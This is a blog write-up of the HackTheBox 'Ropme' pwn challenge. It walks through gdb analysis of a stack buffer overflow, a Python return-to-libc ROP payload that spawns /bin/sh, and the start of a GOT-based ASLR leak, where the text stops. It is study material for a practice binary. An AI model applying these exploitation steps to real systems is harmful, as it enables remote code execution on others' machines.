@@ -1,0 +1,974 @@
+<!doctype html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>HackTheBox (HTB) Ropme pwn challenge writeup // Shaked Delarea</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.129.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Shaked Delarea AUTHOR" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackTheBox (HTB) Ropme pwn challenge writeup">
+  <meta name="twitter:description" content="Binary Analysis First of all, I try to find the main function of the binary and then try to find a vulnerability that I can exploit. We see a rather simple main.
+shaked@shaked-ubuntu:~/programming2/challenges/hack_the_box/ropme$ file ropme ropme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped The binary only has one main function and this is it:
+gdb-peda$ disas main Dump of assembler code for function main: 0x0000000000400626 &lt;&#43;0&gt;:	push rbp 0x0000000000400627 &lt;&#43;1&gt;:	mov rbp,rsp 0x000000000040062a &lt;&#43;4&gt;:	sub rsp,0x50 0x000000000040062e &lt;&#43;8&gt;:	mov DWORD PTR [rbp-0x44],edi 0x0000000000400631 &lt;&#43;11&gt;:	mov QWORD PTR [rbp-0x50],rsi 0x0000000000400635 &lt;&#43;15&gt;:	mov edi,0x4006f8 0x000000000040063a &lt;&#43;20&gt;:	call 0x4004e0 &lt;puts@plt&gt; 0x000000000040063f &lt;&#43;25&gt;:	mov rax,QWORD PTR [rip&#43;0x200a0a] # 0x601050 &lt;stdout@@GLIBC_2.">
+
+    <meta property="og:url" content="http://localhost:1313/posts/blog-1/">
+  <meta property="og:site_name" content="Shaked Delarea">
+  <meta property="og:title" content="HackTheBox (HTB) Ropme pwn challenge writeup">
+  <meta property="og:description" content="Binary Analysis First of all, I try to find the main function of the binary and then try to find a vulnerability that I can exploit. We see a rather simple main.
+shaked@shaked-ubuntu:~/programming2/challenges/hack_the_box/ropme$ file ropme ropme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped The binary only has one main function and this is it:
+gdb-peda$ disas main Dump of assembler code for function main: 0x0000000000400626 &lt;&#43;0&gt;:	push rbp 0x0000000000400627 &lt;&#43;1&gt;:	mov rbp,rsp 0x000000000040062a &lt;&#43;4&gt;:	sub rsp,0x50 0x000000000040062e &lt;&#43;8&gt;:	mov DWORD PTR [rbp-0x44],edi 0x0000000000400631 &lt;&#43;11&gt;:	mov QWORD PTR [rbp-0x50],rsi 0x0000000000400635 &lt;&#43;15&gt;:	mov edi,0x4006f8 0x000000000040063a &lt;&#43;20&gt;:	call 0x4004e0 &lt;puts@plt&gt; 0x000000000040063f &lt;&#43;25&gt;:	mov rax,QWORD PTR [rip&#43;0x200a0a] # 0x601050 &lt;stdout@@GLIBC_2.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-04-12T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-04-12T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://localhost:1313/"><img class="app-header-avatar" src="/desk.jpg" alt="Shaked Delarea AUTHOR" /></a>
+      <span class="app-header-title">Shaked Delarea</span>
+      <p>Security Researcher</p>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+      </nav>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/gohugoio" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/gohugoio" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="mailto:shaqedelarea@gmail.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Email</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HackTheBox (HTB) Ropme pwn challenge writeup</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 12, 2020
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          26 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h3 id="binary-analysis">Binary Analysis</h3>
+<p>First of all, I try to find the main function of the binary and then try to find a vulnerability that I can exploit. We see a rather simple main.</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:~/programming2/challenges/hack_the_box/ropme$ file ropme
+ropme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped
+</code></pre><p>The binary only has one main function and this is it:</p>
+<pre tabindex="0"><code>gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x0000000000400626 &lt;+0&gt;:	push   rbp
+   0x0000000000400627 &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040062a &lt;+4&gt;:	sub    rsp,0x50
+   0x000000000040062e &lt;+8&gt;:	mov    DWORD PTR [rbp-0x44],edi
+   0x0000000000400631 &lt;+11&gt;:	mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000400635 &lt;+15&gt;:	mov    edi,0x4006f8
+   0x000000000040063a &lt;+20&gt;:	call   0x4004e0 &lt;puts@plt&gt;
+   0x000000000040063f &lt;+25&gt;:	mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 &lt;stdout@@GLIBC_2.2.5&gt;
+   0x0000000000400646 &lt;+32&gt;:	mov    rdi,rax
+   0x0000000000400649 &lt;+35&gt;:	call   0x400510 &lt;fflush@plt&gt;
+   0x000000000040064e &lt;+40&gt;:	mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x0000000000400655 &lt;+47&gt;:	lea    rax,[rbp-0x40]
+   0x0000000000400659 &lt;+51&gt;:	mov    esi,0x1f4
+   0x000000000040065e &lt;+56&gt;:	mov    rdi,rax
+   0x0000000000400661 &lt;+59&gt;:	call   0x400500 &lt;fgets@plt&gt;
+   0x0000000000400666 &lt;+64&gt;:	mov    eax,0x0
+   0x000000000040066b &lt;+69&gt;:	leave  
+   0x000000000040066c &lt;+70&gt;:	ret    
+End of assembler dump.
+</code></pre><p><strong>QUESTION: What is the vulnerability in the code?</strong>
+Let&rsquo;s break it down to pieces:</p>
+<p>The first piece we observe is this one, which is calling the <code>puts@plt</code>:</p>
+<pre tabindex="0"><code>0x0000000000400635 &lt;+15&gt;:	mov    edi,0x4006f8
+0x000000000040063a &lt;+20&gt;:	call   0x4004e0 &lt;puts@plt&gt;
+</code></pre><p>According to the <a href="https://linux.die.net/man/3/puts">man page of puts</a>: it&rsquo;s defined as <code>int puts(const char *s);</code> which means this function takes exactly 1 argument, which is a pointer to the start of a cstring.</p>
+<p><strong>QUESTION: Why is the argument passed through EDI? Why not through the stack?</strong>
+When using the fast-call calling convention, the first 6 arguments are passed via the registers:</p>
+<ol>
+<li>RDI Holds the first argument</li>
+<li>RSI Holds the second argument</li>
+<li>RDX Holds the third argument</li>
+<li>RCX Holds the forth argument</li>
+<li>R8 Holds the fifth argument</li>
+<li>R9 Holds the sixth argument</li>
+</ol>
+<p>The second piece is the calling of <code>fflush</code> which is defined as <code>int fflush(FILE *stream);</code></p>
+<pre tabindex="0"><code>0x000000000040063f &lt;+25&gt;:	mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 &lt;stdout@@GLIBC_2.2.5&gt;
+0x0000000000400646 &lt;+32&gt;:	mov    rdi,rax
+0x0000000000400649 &lt;+35&gt;:	call   0x400510 &lt;fflush@plt&gt;
+</code></pre><p>So here we see that <code>stdout</code> is being put on RDI and then the call to <code>fflush</code> takes place. After looking at the <a href="https://linux.die.net/man/3/fflush">man page of fflush</a>: I noticed that I can call <code>fflush(0)</code> and flush all the streams at once, this could be handy in the future.</p>
+<p>The third and last piece of the main is the one calling <code>fgets</code> which is defined as <code>char *fgets(char *s, int size, FILE *stream);</code>. Let&rsquo;s observe the code:</p>
+<pre tabindex="0"><code>0x000000000040064e &lt;+40&gt;:	mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 &lt;stdin@@GLIBC_2.2.5&gt;
+0x0000000000400655 &lt;+47&gt;:	lea    rax,[rbp-0x40]
+0x0000000000400659 &lt;+51&gt;:	mov    esi,0x1f4
+0x000000000040065e &lt;+56&gt;:	mov    rdi,rax
+0x0000000000400661 &lt;+59&gt;:	call   0x400500 &lt;fgets@plt&gt;
+</code></pre><p>Here, we notice that:</p>
+<ol>
+<li>RDX Holds the third argument which is <code>FILE *</code> (stdout actually)</li>
+<li>RSI Holds the second which is the <code>int size</code> as <code>0x1f4 = 500</code></li>
+<li>RDI Holds the first argument which is the location of the buffer we are writing to</li>
+</ol>
+<p>So, the program is asking for <code>500</code> bytes and places them on a buffer which is located on the stack, if we take a look again at the argument at RDI we notice that is pointing to <code>rbp-0x40</code> so that means if we write more than <code>0x40 = 64</code> bytes to that buffer - we would override the <code>rbp</code> value and most likely the return address afterwards</p>
+<p><strong>The vulnerability is clear, we&rsquo;re dealing with a buffer overflow here.</strong></p>
+<p>The next thing I do after discovering that I could use a vulnerability is to determine what am I allowed to do. Usually if the buffer overflow was due to a use of <code>strcpy</code> then that means I cannot use null bytes.</p>
+<p>But that is not the case here, if we take a look at <a href="https://linux.die.net/man/3/fgets">fgets man page</a>: we see that <code>fgets</code> stops getting its input after EOF or a new line</p>
+<blockquote>
+<p>fgets() reads in at most one less than size characters from stream and stores them into the buffer pointed to by s. Reading stops after an EOF or a newline. If a newline is read, it is stored into the buffer. A terminating null byte (aq\0aq) is stored after the last character in the buffer.</p>
+</blockquote>
+<p>Great! so we can use null bytes in our input. But have to remember to avoid using newline as a character.</p>
+<p>So, to sum up the first part of the analysis:</p>
+<ul>
+<li>We have to exploit the buffer overflow vulnerability to somehow redirect the program to execute arbitrary code, I&rsquo;m thinking of <code>system(&quot;/bin/sh&quot;)</code></li>
+<li>We have to assume ASLR is on
+<ul>
+<li>We do not know the location which <code>system</code> is placed</li>
+<li>I cannot use the <code>&quot;/bin/sh&quot;</code> string by writing it to the stack. And of course we also do not know the location of that string in <code>libc</code> because of ASLR</li>
+</ul>
+</li>
+<li>Even if ASLR might be defeated, and we could learn the base address which libc is being loaded to - <strong>the offsets of stuff may change because the libc version of the remote machine may be different from ours</strong>, we have to keep that in mind when exploiting remote machines</li>
+</ul>
+<h3 id="exploiting-the-binary-locally">Exploiting the binary locally</h3>
+<p>Before I worry myself about the remote machine and ASLR and glibc version; I try to see if I can utilize the buffer overflow locally. I usually start by manipulating the data <em>manually</em> in GDB, then formulate a payload using a Python script.</p>
+<p>I start with a simple python script that fills the buffer (of size 64 if we recall), and overrides the frame pointer (the old EBP, of size 8 bytes because this binary is x64). So we need <code>64+8=72</code> bytes to fill the buffer and then we will be able to override the return address on the stack. Let&rsquo;s try!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>PAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print PAD
+</span></span></code></pre></div><p>Feeding this input to the binary our stack looks like this</p>
+<pre tabindex="0"><code>gdb-peda$ x/32gx $rsp
+0x7fffffffdef0:	0x00007fffffffe028	0x0000000100f0b5ff
+0x7fffffffdf00:	0x4141414141414141	0x4141414141414141
+0x7fffffffdf10:	0x4141414141414141	0x4141414141414141
+0x7fffffffdf20:	0x4141414141414141	0x4141414141414141
+0x7fffffffdf30:	0x4141414141414141	0x4141414141414141
+0x7fffffffdf40:	0x4141414141414141	0x00007ffff7a0000a
+0x7fffffffdf50:	0x0000000000000000	0x00007fffffffe028
+0x7fffffffdf60:	0x0000000100000000	0x0000000000400626
+0x7fffffffdf70:	0x0000000000000000	0xb9494950d49272fd
+0x7fffffffdf80:	0x0000000000400530	0x00007fffffffe020
+0x7fffffffdf90:	0x0000000000000000	0x0000000000000000
+0x7fffffffdfa0:	0x46b6b62f66d272fd	0x46b6a6906eec72fd
+0x7fffffffdfb0:	0x00007fff00000000	0x0000000000000000
+0x7fffffffdfc0:	0x0000000000000000	0x00007ffff7de5733
+0x7fffffffdfd0:	0x00007ffff7dcb638	0x000000001d423c36
+0x7fffffffdfe0:	0x0000000000000000	0x0000000000000000
+gdb-peda$ bt
+#0  0x000000000040066b in main ()
+#1  0x00007ffff7a0000a in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+#2  0x0000000000000000 in ?? ()
+gdb-peda$
+</code></pre><p>Let&rsquo;s look for the <code>system</code> function location, and the <code>/bin/sh</code> string in libc, and load them</p>
+<pre tabindex="0"><code>gdb-peda$ info proc mappings
+process 15772
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+            0x400000           0x401000     0x1000        0x0 /media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme/ropme
+            0x600000           0x601000     0x1000        0x0 /media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme/ropme
+            0x601000           0x602000     0x1000     0x1000 /media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme/ropme
+            0x602000           0x623000    0x21000        0x0 [heap]
+      0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bcb000     0x7ffff7dcb000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7dcb000     0x7ffff7dcf000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7dcf000     0x7ffff7dd1000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7dd1000     0x7ffff7dd5000     0x4000        0x0
+      0x7ffff7dd5000     0x7ffff7dfc000    0x27000        0x0 /lib/x86_64-linux-gnu/ld-2.27.so
+      0x7ffff7fe0000     0x7ffff7fe2000     0x2000        0x0
+      0x7ffff7ff7000     0x7ffff7ffa000     0x3000        0x0 [vvar]
+      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
+      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x27000 /lib/x86_64-linux-gnu/ld-2.27.so
+      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x28000 /lib/x86_64-linux-gnu/ld-2.27.so
+      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+gdb-peda$ search
+search     searchmem  
+gdb-peda$ searchmem &#34;/bin/sh&#34; 0x7ffff79e4000     0x7ffff7bcb000
+Searching for &#39;/bin/sh&#39; in range: 0x7ffff79e4000 - 0x7ffff7bcb000
+Found 1 results, display max 1 items:
+libc : 0x7ffff7b97e9a --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
+gdb-peda$ p system
+$1 = {int (const char *)} 0x7ffff7a33440 &lt;__libc_system&gt;
+</code></pre><p>So the location of <code>system</code> is <code>0x7ffff7a33440</code>. And <code>/bin/sh</code> is located at <code>0x7ffff7b97e9a</code></p>
+<pre tabindex="0"><code>gdb-peda$ set {long long int} 0x7fffffffdf48 = 0x7ffff7a33440
+gdb-peda$ set $rdi = 0x7ffff7b97e9a
+</code></pre><p>After setting the values, we can check where does gdb think we should return to</p>
+<pre tabindex="0"><code>gdb-peda$ bt
+#0  0x000000000040066c in main ()
+#1  0x00007ffff7a33440 in ?? () at ../sysdeps/unix/sysv/linux/system.c:75 from /lib/x86_64-linux-gnu/libc.so.6
+#2  0x0000000000000000 in ?? ()
+</code></pre><p>And what is at that address we&rsquo;re about to return to?</p>
+<pre tabindex="0"><code>gdb-peda$ disas 0x00007ffff7a33440
+Dump of assembler code for function __libc_system:
+   0x00007ffff7a33440 &lt;+0&gt;:	test   rdi,rdi
+   0x00007ffff7a33443 &lt;+3&gt;:	je     0x7ffff7a33450 &lt;__libc_system+16&gt;
+   0x00007ffff7a33445 &lt;+5&gt;:	jmp    0x7ffff7a32eb0 &lt;do_system&gt;
+   0x00007ffff7a3344a &lt;+10&gt;:	nop    WORD PTR [rax+rax*1+0x0]
+   0x00007ffff7a33450 &lt;+16&gt;:	lea    rdi,[rip+0x164a4b]        # 0x7ffff7b97ea2
+   0x00007ffff7a33457 &lt;+23&gt;:	sub    rsp,0x8
+   0x00007ffff7a3345b &lt;+27&gt;:	call   0x7ffff7a32eb0 &lt;do_system&gt;
+   0x00007ffff7a33460 &lt;+32&gt;:	test   eax,eax
+   0x00007ffff7a33462 &lt;+34&gt;:	sete   al
+   0x00007ffff7a33465 &lt;+37&gt;:	add    rsp,0x8
+   0x00007ffff7a33469 &lt;+41&gt;:	movzx  eax,al
+   0x00007ffff7a3346c &lt;+44&gt;:	ret    
+End of assembler dump.
+</code></pre><p>We will continue execution, expecting to run <code>system(&quot;/bin/sh&quot;)</code> when we actually get hit with a segmentation fault:</p>
+<pre tabindex="0"><code>   0x7ffff7a332e6 &lt;do_system+1078&gt;:	movq   xmm0,QWORD PTR [rsp+0x8]
+   0x7ffff7a332ec &lt;do_system+1084&gt;:	mov    QWORD PTR [rsp+0x8],rax
+   0x7ffff7a332f1 &lt;do_system+1089&gt;:	movhps xmm0,QWORD PTR [rsp+0x8]
+=&gt; 0x7ffff7a332f6 &lt;do_system+1094&gt;:	movaps XMMWORD PTR [rsp+0x40],xmm0
+   0x7ffff7a332fb &lt;do_system+1099&gt;:	call   0x7ffff7a23110 &lt;__GI___sigaction&gt;
+   0x7ffff7a33300 &lt;do_system+1104&gt;:	lea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 &lt;quit&gt;
+   0x7ffff7a33307 &lt;do_system+1111&gt;:	xor    edx,edx
+   0x7ffff7a33309 &lt;do_system+1113&gt;:	mov    edi,0x3
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffddb8 --&gt; 0x5c599e31
+0008| 0x7fffffffddc0 --&gt; 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&#39;-c&#39;)
+0016| 0x7fffffffddc8 --&gt; 0x0
+0024| 0x7fffffffddd0 --&gt; 0x0
+0032| 0x7fffffffddd8 --&gt; 0x7ffff7a33360 (&lt;cancel_handler&gt;:	push   rbx)
+0040| 0x7fffffffdde0 --&gt; 0x7fffffffddd4 --&gt; 0xf7a3336000000000
+0048| 0x7fffffffdde8 --&gt; 0x8d888aa005043400
+0056| 0x7fffffffddf0 --&gt; 0x7ffff7dcfa00 --&gt; 0xfbad2088
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00007ffff7a332f6 in do_system (line=0x7ffff7b97e9a &#34;/bin/sh&#34;) at ../sysdeps/posix/system.c:125
+125	../sysdeps/posix/system.c: No such file or directory.
+</code></pre><p><strong>What? A segmentation fault? why?</strong></p>
+<p>After breaking my head over this for a long time, I learned that when you call <code>system</code> the stack needs to be &ldquo;16 bytes aligned&rdquo; otherwise an exception is thrown (like we&rsquo;ve just experienced).</p>
+<p>When the compiler prepares the binary for us from the C code he always makes sure this happens, but when we mess around with the registers and the jumps - we can break things.</p>
+<p>So what do we do? First, we have to make sure the stack pointer is 16 bytes aligned and not 8 bytes aligned like it is right now.
+Because as of now, when we <code>ret</code> to <code>system</code> the stack pointer ends with <code>8</code> and we need it to end with <code>0</code> (in hex, if the least-significant-bit is zero, the number is a multiple of 16).</p>
+<p>How do we get there? well, if we think about it for a second, in the end-result exploit we will need to pass an argument to <code>RDI</code> before calling system, so if we could first <code>ret</code> to some instruction that does something like <code>pop rdi; ret</code>, our stack will be 16 bytes aligned! (Do you see why?)</p>
+<p>So we are looking for a ROP gadget, preferably one that is in a location which is not randomized by ASLR.
+PEDA (a nice gdb plugin) provides a nice way of looking for gadgets via a string.</p>
+<pre tabindex="0"><code>gdb-peda$ info proc mappings
+process 31239
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+            0x400000           0x401000     0x1000        0x0 /media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme/ropme
+            0x600000           0x601000     0x1000        0x0 /media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme/ropme
+            0x601000           0x602000     0x1000     0x1000 /media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme/ropme
+      0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bcb000     0x7ffff7dcb000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7dcb000     0x7ffff7dcf000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7dcf000     0x7ffff7dd1000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7dd1000     0x7ffff7dd5000     0x4000        0x0
+      0x7ffff7dd5000     0x7ffff7dfc000    0x27000        0x0 /lib/x86_64-linux-gnu/ld-2.27.so
+      0x7ffff7fdf000     0x7ffff7fe1000     0x2000        0x0
+      0x7ffff7ff7000     0x7ffff7ffa000     0x3000        0x0 [vvar]
+      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
+      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x27000 /lib/x86_64-linux-gnu/ld-2.27.so
+      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x28000 /lib/x86_64-linux-gnu/ld-2.27.so
+      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+gdb-peda$ ropsearch &#34;pop rdi&#34; 0x400000           0x401000
+Searching for ROP gadget: &#39;pop rdi&#39; in range: 0x400000 - 0x401000
+0x004006d3 : (b&#39;5fc3&#39;)	pop rdi; ret
+</code></pre><p>This is good because now we can put something on the stack that will be <code>pop</code>ed to <code>RDI</code>, and then return to an arbitrary address. I will keep in mind that the gadget I found is in a location that is not randomized by ASLR and may be very handy when crafting out final exploit.</p>
+<p>Our current exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ptr</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4006d3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x7ffff7a33440</span>)
+</span></span><span style="display:flex;"><span>binsh_addr<span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x7ffff7b97e9a</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> PAD
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> binsh_addr           <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> system_addr          <span style="color:#75715e"># return here with stack aligned</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print payload
+</span></span></code></pre></div><p>So far, the exploit works locally, <strong>if of course, we disable ASLR</strong>. So the next step is to think: what are the locations of <code>system</code> and <code>&quot;bin/sh&quot;</code> going to be on the remote machine? how do we defeat ASLR?</p>
+<h3 id="defeating-aslr-via-information-leak">Defeating ASLR via information leak</h3>
+<p>When I say &ldquo;defeating ASLR&rdquo; I basically mean: &ldquo;how do I know the base which libc is loaded to every time?&rdquo; because if I know the base address, I could compute the location of other symbols in libc based on their known offsets. So obviously we cannot know where libc is loaded to right away, we do not have kernel access to the remote machine and we cannot really brute force our way to the right address.</p>
+<p>So the solution here is to exploit some chunk of the code that could tell us where some location which we recognize, was loaded.
+For example, if we know <code>puts</code> was loaded to virtual address <code>0x100</code> and we know the offset of puts from the beginning of libc is <code>0x10</code>, then it means the base of libc is <code>0x100 - 0x10 = 0xf0</code>!</p>
+<p>How can we know the location of some address of <code>puts</code>? fortunately for us, <code>puts</code> is being called by the program and is a part of the original code.
+Thanks to that, the address of puts is stored on the Global Offset Table (GOT) of the file.</p>
+<p>Looking at the file&rsquo;s relocations table we can see the following:</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:~/programming2/challenges/hack_the_box/ropme$ objdump -R ropme
+
+ropme:     file format elf64-x86-64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE
+0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
+0000000000601050 R_X86_64_COPY     stdout@@GLIBC_2.2.5
+0000000000601060 R_X86_64_COPY     stdin@@GLIBC_2.2.5
+0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
+0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
+0000000000601028 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
+0000000000601030 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
+</code></pre><p>What we learn from this is that the location of <code>puts</code> at libc will be determined during runtime and will be stored at a fixed non-randomized location which is: <code>0x601018</code>. (This can be confirmed also if you follow the call to <code>puts@plt</code>)</p>
+<p>So the plan is clear, we need to somehow make the program leak the location at address <code>0x601018</code>, to do that we can manipulate the program to call <code>puts((char *) (*0x601018))</code>. How is that possible?</p>
+<ul>
+<li>Well, the location of <code>puts@plt</code> is fixed as this is a PLT stub that actually calls the true function, so we will just <code>ret</code> to that stub</li>
+<li>We know the location which we want to print, we would make the program print the value in <code>0x601018</code> as a string but we will read the bytes from it and learn the address of <code>puts</code></li>
+</ul>
